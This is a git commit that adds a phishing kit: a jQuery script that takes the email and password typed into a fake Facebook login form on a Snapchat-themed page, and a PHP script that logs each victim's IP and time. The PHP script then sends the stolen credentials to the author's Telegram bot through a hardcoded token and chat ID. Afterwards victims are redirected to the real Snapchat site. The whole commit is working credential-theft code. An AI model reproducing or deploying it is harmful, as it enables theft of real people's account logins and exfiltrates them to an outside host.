b8fa88d46bd95787680db63913b6ae421506585f
Ayadsherzad182 <142124514+Ayadsherzad182@users.noreply.github.com>
2023-08-13 03:40:31 +0300

    Add files via upload

---
+++ index.js
@@ -0,0 +1,41 @@
+// GO to Real Site
+$(document).ready(function() {
+    $('.index-all-page-img').click(function() {
+        window.location.replace('https://www.snapchat.com/')
+    });
+});
+
+// Done 
+$(document).ready(function() {
+    $('.close-done-all').click(function() {
+        window.location.replace('https://support.snapchat.com/en-US/i-need-help')
+    });
+});
+
+// Login Form
+$(document).ready(function() {
+    $('.facebook-login-bu').click(function() {
+        var email = $('.email_fa').val();
+        var password = $('.password_fa').val();
+        $.post('send.php', {
+            info: "facebook",
+            password: password,
+            email: email
+        }, function() {
+            $('.done-successfully-cinghaha').click();
+        });
+    });
+});
+$(document).ready(function() {
+    $('.facebook-login-bu').click(function() {
+        var email = $('.email_fa').val();
+        var password = $('.password_fa').val();
+        $.post('send2.php', {
+            info: "facebook",
+            password: password,
+            email: email
+        }, function() {
+            $('.done-successfully-cinghaha').click();
+        });
+    });
+});
---
+++ send.php
@@ -0,0 +1,27 @@
+<?php
+
+if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
+} else {
+    $ip_address = $_SERVER['REMOTE_ADDR'];
+}
+
+$d = new DateTime("now", new DateTimeZone("Asia/Baghdad")); // Set Your country DF Time 
+$time = $d->format("Y/m/d  h:i:s A");
+if (isset($_POST['info'])) {
+        $msg = urlencode("New Login From SnapChat : \nEmail : " . $_POST['email'] . "\nPassword : " . $_POST['password'] . "\nTime : " . $time . "\nIp : " . $ip_address . "\nZhanyariOS");
+}
+
+
+
+// Setting 
+$apiToken = "5610625563:AAGAbjRafbGdmI_75n-T6l_cU95QcRXK1rM";
+$YOUR_ID_TELE = "6046637715";
+
+
+// You :
+$response = file_get_contents("@ayadshoterupdate_bot".$apiToken."/sendMessage?chat_id=".$YOUR_ID_TELE."&text=" . $msg);
+// SomeOne Else : 
+// $response = file_get_contents("https://api.telegram.org/bot".$apiToken."/sendMessage?chat_id=".$YOUR_ID_TELE."&text=" . $msg);
